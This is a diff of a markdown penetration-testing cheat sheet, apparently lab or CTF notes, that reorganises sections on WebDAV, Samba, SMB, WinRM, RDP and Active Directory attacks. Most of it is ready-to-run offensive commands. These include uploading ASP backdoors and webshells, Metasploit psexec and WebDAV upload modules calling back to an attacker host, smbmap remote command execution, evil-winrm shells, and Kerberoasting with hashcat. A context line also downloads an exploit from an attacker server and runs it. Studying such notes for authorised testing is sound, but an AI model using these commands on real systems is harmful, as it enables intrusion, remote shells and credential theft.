@@ -104,7 +104,7 @@
     - `gobuster -u http://10.10.93.218/ -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt dir `
     - `use auxiliary/scanner/http/brute_dirs` / `use auxiliary/scanner/http/dir_scanner`
 
-#### **HTTP**
+#### HTTP
 
 - Server Banner and version
     - `use auxiliary/scanner/http/http_version`
@@ -113,13 +113,32 @@
     - `lynx http://192.102.102.3`
 
 ###### WebDav 
--
-    - Http methods supported by /webdav
-        - `nmap -p 80 -sV 10.5.17.75 --script http-methods --script-args http-methods.url-path=/webdav/`
-    - Webdav scan
-        - `nmap -p 80 -sV 10.5.17.75 --script http-webdav-scan --script-args http-methods.url-path=/webdav/`
-    - Checking files that can be uploaded
-        - `davtest -auth bob:password_123321 -url http://10.5.27.32`
+**ENUMERATION**
+- Http methods supported by /webdav
+    - `nmap -p 80 -sV 10.5.17.75 --script http-methods --script-args http-methods.url-path=/webdav/`
+- Webdav scan
+    - `nmap -p 80 -sV 10.5.17.75 --script http-webdav-scan --script-args http-methods.url-path=/webdav/`
+- Checking files that can be uploaded
+    - `davtest -auth bob:password_123321 -url http://10.5.27.32`
+
+**EXPLOITATION**
+
+- Connectiing to site
+    - `curl http://192.245.191.3/webdav/ --user "admin:angels"` / `curl http://192.245.191.3/secure/ --user "admin:brittany"`
+- Connecting Webdav
+    - `davtest -auth admin:angels -url http://192.245.191.3/webdav/`
+    
+- Uploading files
+    - `curl http://192.49.74.3/webdav/ --user "admin:angels" --upload-file /root/backdoor.asp`
+- Downloading files
+
+- Uploading/Downloading/Deleting files to /Webdav
+    - `cadaver http://10.5.27.32/webdav`
+        - `put /usr/share/webshells/asp/webshell.asp `
+        - `delete webshell.asp`
+
+- Uploading files using Metasploit
+    - `use exploit/windows/iis/iis_webdav_upload_asp` > `set RHOSTS 10.5.26.116` > `set PATH /webdav/newshell.asp` > `set httpUsername bob` > `set httppassword password_123321` > `set LHOST 10.10.12.2` >  `set LPORT 1234` > `exploit`
 
 ###### Wordpress 
 
@@ -296,7 +315,132 @@ Here’s an example `web.xml` file.
 
 ###### Tomcat
 
-#### **SMB**
+
+
+#### FTP
+
+- [ ] Version: Check for FTP Version (ProFTPD, VSFTPD etc..) (If it is vulnerable)
+    - `nmap 192.60.4.3 -sV -p 21`
+
+- [ ] Anonymous login: Check if FTP Anonymous login is allowed
+    - `ftp 192.60.4.3 ` (provide blank password)
+    - `nmap 192.176.71.3 -p 21 --script ftp-anon`
+
+- FTP connection - `ftp 192.60.4.3 `
+- Uploading and Downloading files
+    - ftp> `get secret.txt`
+
+#### SSH
+
+- OpenSSH version 
+    - `nmap 192.238.103.3 -p 22 -sV -O`
+    - `nc 192.238.103.3 22`
+- Checking if Authentication is required and Type of Authentication supported
+    - `nmap 192.238.103.3 -p 22 --script ssh-auth-methods --script-args="ssh.user=student"`
+- Encryption Algorithm for key supported by SSH server
+    - `nmap 192.238.103.3 -p 22 --script ssh2-enum-algos`
+- Checking ssh-hostkey ie the public key on server
+    - `nmap 192.238.103.3 -p 22 --script ssh-hostkey --script-args ssh_hostkey=full`
+
+- SSH connection 
+    - `ssh root@192.238.103.3`
+    - `ssh 192.168.204.134 -okexAlgorithms=+diffie-hellman-group-exchange-sha1 -oHostKeyAlgorithms=+ssh-dss -c aes128-cbc`
+    - `ssh -i ssh-key user@192.168.204.132 -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedAlgorithms=+ssh-rsa`
+
+
+#### SAMBA
+
+##### Enumeration
+
+- Samba enumeration (all possible things)
+    - `enum4linux -e 10.10.18.135`
+
+- Samba version, workgroup name, 
+    - `nmap 192.213.18.3 -sV -p 445`
+    - `nmap --top-port 25 -sU --open 192.213.18.3 -sV`
+    - `use auxiliary/scanner/smb/smb_version`
+- Samba OS discovery, Netbios name,  computer name
+    - `nmap -p 445 192.213.18.3 --script smb-os-discovery`
+    - `rpcclient -U "" -N 192.230.148.3` > `srvinfo`
+    - `enum4linux -O 192.54.223.3 -p 445`
+    - `nmblookup -A 192.221.150.3`
+- Samba Anonymous connection
+    - `smbclient -L 192.221.150.3`
+    - `rpcclient -U "" -N 192.230.148.3`
+- Samba accessing shares by connection
+    - `smbclient //192.120.159.3/public - N`
+    - `smbclient //192.241.81.3/admin -U admin` 
+    - `smbclient //192.180.12.3/shawn -U admin` > `?`
+- Samaba listing users
+    - `nmap --script smb-enum-users --script-args smbusername=admin,smbpassword=password1 192.157.202.3`
+    - `use auxiliary/scanner/smb/smb_enumusers`
+    - `enum4linux -U 192.54.223.3 -p 445`
+    - `rpcclient -U "" -N 192.54.223.3` >`enumdomusers` 
+- Samba finding SID of admin
+    - `rpcclient -U "" -N 192.54.223.3` > `lookupnames admin`
+    - `enum4linux -r -u "admin" -p "password1" 192.241.81.3`
+- Samba finding domain groups
+    - `enum4linux -G  192.120.159.3`
+    - `rpcclient -U "" -N 192.120.159.3` > `enumdomgroups`
+- Samba listing shares and thrier permissions
+    - `nmap --script smb-enum-shares -script-args smbusername=admin,smbpassword=password1 192.54.233.3`
+    - `smbclient -L 192.221.150.3`
+    - `smbmap -u guest -p "" -d .  -H 10.5.26.125`
+    - `smbmap -u administrator -p smbserver_771 -d .  -H 10.5.26.125`
+    - `enum4linux -S  192.120.159.3`
+    - `use auxiliary/scanner/smb/smb_enumshares`
+- Samba listing content of shared drive
+    - `smbmap -u administrator -p smbserver_771 -d .  -H 10.5.26.125 -r 'C$'`
+    - `smbclient //192.120.159.3/public - N` > `ls`
+- Samba uploading file to network share
+    - `smbmap -u administrator -p smbserver_771 --upload '/root/backdoor' 'C$\backdoor' -H 10.5.24.17`
+- Samba downloaing file from network share
+    - `smbmap -u administrator -p smbserver_771 --download 'C$\flag.txt' -H 10.5.24.17`
+- Samba remote code execution
+    - `smbmap -u administrator -p smbserver_771 -d .  -H 10.5.26.125 -x 'ipconfig'`
+- Samba pipes available
+    - `use auxiliary/scanner/smb/pipe_auditor`
+- Samba printer configuration
+    - `enum4linux -I  192.120.159.3`
+
+##### Exploitation
+
+- Samba listing users
+    - `nmap --script smb-enum-users --script-args smbusername=admin,smbpassword=password1 192.157.202.3`
+    - `use auxiliary/scanner/smb/smb_enumusers`
+    - `enum4linux -U 192.54.223.3 -p 445`
+    - `rpcclient -U "" -N 192.54.223.3` >`enumdomusers` 
+- Samba accessing shares by connection
+    - `smbclient //192.120.159.3/public - N`
+    - `smbclient //192.241.81.3/admin -U admin` 
+    - `smbclient //192.180.12.3/shawn -U admin` > `?`
+- Samba listing shares and thrier permissions
+    - `nmap --script smb-enum-shares -script-args smbusername=admin,smbpassword=password1 192.54.233.3`
+    - `smbclient -L 192.221.150.3`
+    - `smbmap -u guest -p "" -d .  -H 10.5.26.125`
+    - `smbmap -u administrator -p smbserver_771 -d .  -H 10.5.26.125`
+    - `enum4linux -S  192.120.159.3`
+    - `use auxiliary/scanner/smb/smb_enumshares`
+- Samba listing content of shared drive
+    - `smbmap -u administrator -p smbserver_771 -d .  -H 10.5.26.125 -r 'C$'`
+    - `smbclient //192.120.159.3/public - N` > `ls`
+- Samba uploading file to network share
+    - `smbmap -u administrator -p smbserver_771 --upload '/root/backdoor' 'C$\backdoor' -H 10.5.24.17`
+- Samba downloaing file from network share
+    - `smbmap -u administrator -p smbserver_771 --download 'C$\flag.txt' -H 10.5.24.17`
+- Samba remote code execution
+    - `smbmap -u administrator -p smbserver_771 -d .  -H 10.5.26.125 -x 'ipconfig'`
+- Samba pipes available
+    - `use auxiliary/scanner/smb/pipe_auditor`
+- Samba finding SID of admin
+    - `rpcclient -U "" -N 192.54.223.3` > `lookupnames admin`
+    - `enum4linux -r -u "admin" -p "password1" 192.241.81.3`
+- Exploiting Using Metasploit
+    - `use exploit/linux/samba/is_known_pipename `
+
+#### SMB
+
+##### Enumeration
 
 - SMB version
     - `nmap --script smb-protocols 10.5.16.60 -p 445 `
@@ -317,30 +461,66 @@ Here’s an example `web.xml` file.
 - SMB statistics (failed logins. errors etc..)
     - `nmap --script smb-server-stats --script-args smbusername=administrator,smbpassword=smbserver_771 -p 445 10.5.29.205`
 
+##### Exploitation
+
+###### DumpShares
+
+- Dump All Share Accessible recusrively
+```
+┌──(kali㉿kali)-[~]
+└─$ `smbclient //10.10.90.60/Users -U guest `
+Password for [WORKGROUP\guest]:
+Try "help" to get a list of possible commands.
+            
+smb: \> recurse ON
+smb: \> mask ""
+smb: \> prompt OFF
+smb: \> mget *
+```
+###### RemoteCodeExecution
+-
+
+###### KnownExploits
+- EternalBlue
+    - Exploiting `EternalBlue` vulnerabibility in SMBv1
+        - `use auxiliary/scanner/smb/smb_ms17_010`
+
+    - Exploiting Security misconsifugration *Message signing enabled but not required* by `PSExec`
+        - First finding credentials by brute forcing
+            - `scanner/smb/smb_login` / `hydra` / any other
+        - Exploiting flaw using metasploit `PsExec` module
+            - `use exploit/windows/smb/psexec` > `set RHOSTS 10.5.22.249` > `set LHOST 10.10.26.2` > `set SMBUSER administrator` > `set SMBPASS qwertyuiop` > `set LPORT 1234` > `exploit`
+
+#### RDP
+
+- Connecting RDP
+    - `xfreerdp /u:administrator /p:qwertyuiop /v:10.5.31.78:3333`
 
 
 
-#### **FTP**
+#### WinRM
 
-- [ ] Version: Check for FTP Version (ProFTPD, VSFTPD etc..) (If it is vulnerable)
-    - `nmap 192.60.4.3 -sV -p 21`
+- Arbitiary command execution
+    - `crackmapexec winrm 10.5.27.211 -u administrator -p tinkerbell -x "whoami"` / `crackmapexec winrm 10.5.27.211 -u administrator -p tinkerbell -x "systeminfo"`
 
-- [ ] Anonymous login: Check if FTP Anonymous login is allowed
-    - `ftp 192.60.4.3 ` (provide blank password)
-    - `nmap 192.176.71.3 -p 21 --script ftp-anon`
+- Getting Command shell
+    - `evil-winrm.rb -u administrator -p tinkerbell -i 10.5.27.211`
+    - `use windows/winrm/winrm_script_exec` > `set RHOSTS 10.5.27.211` > `set RPORT 5985` > `set USERNAME administrator` > `set PASSWORD tinkerbell` > `set FORCE_VBS true` > `exploit`
 
 
-#### **SSH**
 
-- OpenSSH version 
-    - `nmap 192.238.103.3 -p 22 -sV -O`
-    - `nc 192.238.103.3 22`
-- Checking if Authentication is required and Type of Authentication supported
-    - `nmap 192.238.103.3 -p 22 --script ssh-auth-methods --script-args="ssh.user=student"`
-- Encryption Algorithm for key supported by SSH server
-    - `nmap 192.238.103.3 -p 22 --script ssh2-enum-algos`
-- Checking ssh-hostkey ie the public key on server
-    - `nmap 192.238.103.3 -p 22 --script ssh-hostkey --script-args ssh_hostkey=full`
+#### Active Directory
+
+##### Enumeration
+
+##### Exploitation
+###### Kerberosting
+
+- Checking if user is kerberostable, ie if user has SPN or not
+    - `impacket-GetUserSPNs 'LAB.ENTERPRISE.THM/nik:ToastyBoi!' -dc-ip 10.10.130.255 -request`
+
+- Crack the service ticket hash if found
+    - `hashcat -m 13100  -a 0 hash ~/Downloads/rockyou.txt`
 
 
 
@@ -613,188 +793,6 @@ https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation
 - Linux Kernel 3.13.0 < 3.19 - 'overlayfs' Local Privilege Escalation 
     - `mv 37292.c exploit.c` > `python -m http.server 80`  > `wget http://10.17.107.227/exploit.c -P /tmp/` > `cd tmp` > `gcc exploit.c -o exploit` > `./exploit`
     
-#### HTTP
-###### WebDav
-- Connectiing to site
-    - `curl http://192.245.191.3/webdav/ --user "admin:angels"` / `curl http://192.245.191.3/secure/ --user "admin:brittany"`
-- Connecting Webdav
-    - `davtest -auth admin:angels -url http://192.245.191.3/webdav/`
-    
-- Uploading files
-    - `curl http://192.49.74.3/webdav/ --user "admin:angels" --upload-file /root/backdoor.asp`
-- Downloading files
-
-- Uploading/Downloading/Deleting files to /Webdav
-    - `cadaver http://10.5.27.32/webdav`
-        - `put /usr/share/webshells/asp/webshell.asp `
-        - `delete webshell.asp`
-
-- Uploading files using Metasploit
-    - `use exploit/windows/iis/iis_webdav_upload_asp` > `set RHOSTS 10.5.26.116` > `set PATH /webdav/newshell.asp` > `set httpUsername bob` > `set httppassword password_123321` > `set LHOST 10.10.12.2` >  `set LPORT 1234` > `exploit`
-
-#### FTP
-
-- FTP connection - `ftp 192.60.4.3 `
-- Uploading and Downloading files
-    - ftp> `get secret.txt`
-
-#### SSH
-
-- SSH connection 
-    - `ssh root@192.238.103.3`
-    - `ssh 192.168.204.134 -okexAlgorithms=+diffie-hellman-group-exchange-sha1 -oHostKeyAlgorithms=+ssh-dss -c aes128-cbc`
-    - `ssh -i ssh-key user@192.168.204.132 -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedAlgorithms=+ssh-rsa`
-
-
-#### SAMBA
-
-##### Enumeration
-
-- Samba enumeration (all possible things)
-    - `enum4linux -e 10.10.18.135`
-
-- Samba version, workgroup name, 
-    - `nmap 192.213.18.3 -sV -p 445`
-    - `nmap --top-port 25 -sU --open 192.213.18.3 -sV`
-    - `use auxiliary/scanner/smb/smb_version`
-- Samba OS discovery, Netbios name,  computer name
-    - `nmap -p 445 192.213.18.3 --script smb-os-discovery`
-    - `rpcclient -U "" -N 192.230.148.3` > `srvinfo`
-    - `enum4linux -O 192.54.223.3 -p 445`
-    - `nmblookup -A 192.221.150.3`
-- Samba Anonymous connection
-    - `smbclient -L 192.221.150.3`
-    - `rpcclient -U "" -N 192.230.148.3`
-- Samba accessing shares by connection
-    - `smbclient //192.120.159.3/public - N`
-    - `smbclient //192.241.81.3/admin -U admin` 
-    - `smbclient //192.180.12.3/shawn -U admin` > `?`
-- Samaba listing users
-    - `nmap --script smb-enum-users --script-args smbusername=admin,smbpassword=password1 192.157.202.3`
-    - `use auxiliary/scanner/smb/smb_enumusers`
-    - `enum4linux -U 192.54.223.3 -p 445`
-    - `rpcclient -U "" -N 192.54.223.3` >`enumdomusers` 
-- Samba finding SID of admin
-    - `rpcclient -U "" -N 192.54.223.3` > `lookupnames admin`
-    - `enum4linux -r -u "admin" -p "password1" 192.241.81.3`
-- Samba finding domain groups
-    - `enum4linux -G  192.120.159.3`
-    - `rpcclient -U "" -N 192.120.159.3` > `enumdomgroups`
-- Samba listing shares and thrier permissions
-    - `nmap --script smb-enum-shares -script-args smbusername=admin,smbpassword=password1 192.54.233.3`
-    - `smbclient -L 192.221.150.3`
-    - `smbmap -u guest -p "" -d .  -H 10.5.26.125`
-    - `smbmap -u administrator -p smbserver_771 -d .  -H 10.5.26.125`
-    - `enum4linux -S  192.120.159.3`
-    - `use auxiliary/scanner/smb/smb_enumshares`
-- Samba listing content of shared drive
-    - `smbmap -u administrator -p smbserver_771 -d .  -H 10.5.26.125 -r 'C$'`
-    - `smbclient //192.120.159.3/public - N` > `ls`
-- Samba uploading file to network share
-    - `smbmap -u administrator -p smbserver_771 --upload '/root/backdoor' 'C$\backdoor' -H 10.5.24.17`
-- Samba downloaing file from network share
-    - `smbmap -u administrator -p smbserver_771 --download 'C$\flag.txt' -H 10.5.24.17`
-- Samba remote code execution
-    - `smbmap -u administrator -p smbserver_771 -d .  -H 10.5.26.125 -x 'ipconfig'`
-- Samba pipes available
-    - `use auxiliary/scanner/smb/pipe_auditor`
-- Samba printer configuration
-    - `enum4linux -I  192.120.159.3`
-
-##### Exploitation
-
-- Samba listing users
-    - `nmap --script smb-enum-users --script-args smbusername=admin,smbpassword=password1 192.157.202.3`
-    - `use auxiliary/scanner/smb/smb_enumusers`
-    - `enum4linux -U 192.54.223.3 -p 445`
-    - `rpcclient -U "" -N 192.54.223.3` >`enumdomusers` 
-- Samba accessing shares by connection
-    - `smbclient //192.120.159.3/public - N`
-    - `smbclient //192.241.81.3/admin -U admin` 
-    - `smbclient //192.180.12.3/shawn -U admin` > `?`
-- Samba listing shares and thrier permissions
-    - `nmap --script smb-enum-shares -script-args smbusername=admin,smbpassword=password1 192.54.233.3`
-    - `smbclient -L 192.221.150.3`
-    - `smbmap -u guest -p "" -d .  -H 10.5.26.125`
-    - `smbmap -u administrator -p smbserver_771 -d .  -H 10.5.26.125`
-    - `enum4linux -S  192.120.159.3`
-    - `use auxiliary/scanner/smb/smb_enumshares`
-- Samba listing content of shared drive
-    - `smbmap -u administrator -p smbserver_771 -d .  -H 10.5.26.125 -r 'C$'`
-    - `smbclient //192.120.159.3/public - N` > `ls`
-- Samba uploading file to network share
-    - `smbmap -u administrator -p smbserver_771 --upload '/root/backdoor' 'C$\backdoor' -H 10.5.24.17`
-- Samba downloaing file from network share
-    - `smbmap -u administrator -p smbserver_771 --download 'C$\flag.txt' -H 10.5.24.17`
-- Samba remote code execution
-    - `smbmap -u administrator -p smbserver_771 -d .  -H 10.5.26.125 -x 'ipconfig'`
-- Samba pipes available
-    - `use auxiliary/scanner/smb/pipe_auditor`
-- Samba finding SID of admin
-    - `rpcclient -U "" -N 192.54.223.3` > `lookupnames admin`
-    - `enum4linux -r -u "admin" -p "password1" 192.241.81.3`
-- Exploiting Using Metasploit
-    - `use exploit/linux/samba/is_known_pipename `
-
-#### SMB
-###### DumpShares
-
-- Dump All Share Accessible recusrively
-```
-┌──(kali㉿kali)-[~]
-└─$ `smbclient //10.10.90.60/Users -U guest `
-Password for [WORKGROUP\guest]:
-Try "help" to get a list of possible commands.
-            
-smb: \> recurse ON
-smb: \> mask ""
-smb: \> prompt OFF
-smb: \> mget *
-```
-###### RemoteCodeExecution
--
-
-###### KnownExploits
-- EternalBlue
-    - Exploiting `EternalBlue` vulnerabibility in SMBv1
-        - `use auxiliary/scanner/smb/smb_ms17_010`
-
-    - Exploiting Security misconsifugration *Message signing enabled but not required* by `PSExec`
-        - First finding credentials by brute forcing
-            - `scanner/smb/smb_login` / `hydra` / any other
-        - Exploiting flaw using metasploit `PsExec` module
-            - `use exploit/windows/smb/psexec` > `set RHOSTS 10.5.22.249` > `set LHOST 10.10.26.2` > `set SMBUSER administrator` > `set SMBPASS qwertyuiop` > `set LPORT 1234` > `exploit`
-
-#### RDP
-
-- Connecting RDP
-    - `xfreerdp /u:administrator /p:qwertyuiop /v:10.5.31.78:3333`
-
-
-
-#### WinRM
-
-- Arbitiary command execution
-    - `crackmapexec winrm 10.5.27.211 -u administrator -p tinkerbell -x "whoami"` / `crackmapexec winrm 10.5.27.211 -u administrator -p tinkerbell -x "systeminfo"`
-
-- Getting Command shell
-    - `evil-winrm.rb -u administrator -p tinkerbell -i 10.5.27.211`
-    - `use windows/winrm/winrm_script_exec` > `set RHOSTS 10.5.27.211` > `set RPORT 5985` > `set USERNAME administrator` > `set PASSWORD tinkerbell` > `set FORCE_VBS true` > `exploit`
-
-
-
-#### Active Directory
-
-##### Enumeration
-
-##### Exploitation
-###### Kerberosting
-
-- Checking if user is kerberostable, ie if user has SPN or not
-    - `impacket-GetUserSPNs 'LAB.ENTERPRISE.THM/nik:ToastyBoi!' -dc-ip 10.10.130.255 -request`
-
-- Crack the service ticket hash if found
-    - `hashcat -m 13100  -a 0 hash ~/Downloads/rockyou.txt`
 
 ### [Windows Post Exploitation Enumeration](#)
 
